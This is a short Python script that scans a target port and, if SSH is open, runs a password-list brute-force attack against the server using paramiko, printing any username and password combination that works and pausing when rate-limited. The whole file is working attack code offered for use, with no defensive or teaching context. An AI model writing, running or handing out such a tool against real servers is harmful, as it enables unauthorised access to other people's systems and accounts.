import socket
import time
from colorama import init, Fore
import paramiko

# Initialize colorama
init()
GREEN = Fore.GREEN
RED = Fore.RED
RESET = Fore.RESET
BLUE = Fore.BLUE

def scan_port(host, port):
    """
    Scan a single port
    :param host: (str) host to scan
    :param port: (int) port to scan
    :return: None
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)  # Set the timeout to 1 second
        result = sock.connect_ex((host, port))
        if result == 0:
            print(f"Port {port} is open")
            if port == 22:  # If port 22 (SSH) is open, perform the brute-force attack
                brute_force_ssh(host)
        else:
            print(f"Port {port} is closed")
        sock.close()
    except socket.error:
        print("Error occurred while connecting to the host")

def brute_force_ssh(host):
    """
    Perform brute-force attack on SSH server
    :param host: (str) Hostname or IP address of the SSH server
    :return: None
    """
    # Get username and password file
    username = input("Enter the username to use for the brute-force attack: ")
    passfile = input("Enter the path to the password file: ")

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    with open(passfile, "r") as p:
        for passwordAttempt in p:
            password = passwordAttempt.strip()
            try:
                client.connect(hostname=host, username=username, password=password, timeout=1)
            except socket.timeout:
                print(f"{RED}[!] Host: {host} is unreachable. {RESET}")
                return
            except paramiko.AuthenticationException:
                print(f"[!] Invalid Credentials for {username}:{password}")
            except paramiko.SSHException:
                print(f"{BLUE} [*] Quota exceeded, retrying after 1 minute... {RESET}")
                time.sleep(60)
            else:
                print(f"{GREEN} [+] Found Combo: {username}:{password} {RESET}")
                return

    print(f"{RED}[!] Brute-force attack failed. No valid credentials found.{RESET}")

if __name__ == '__main__':
    import argparse

    parser = argparse.ArgumentParser(description="SSH Bruteforce Python script.")
    parser.add_argument("-H", "--host", help="Hostname or IP Address of SSH Server to bruteforce.")
    parser.add_argument("-p", "--port", type=int, default=22, help="SSH port (default: 22)")
    args = parser.parse_args()

    host = args.host
    port = args.port

    scan_port(host, port)
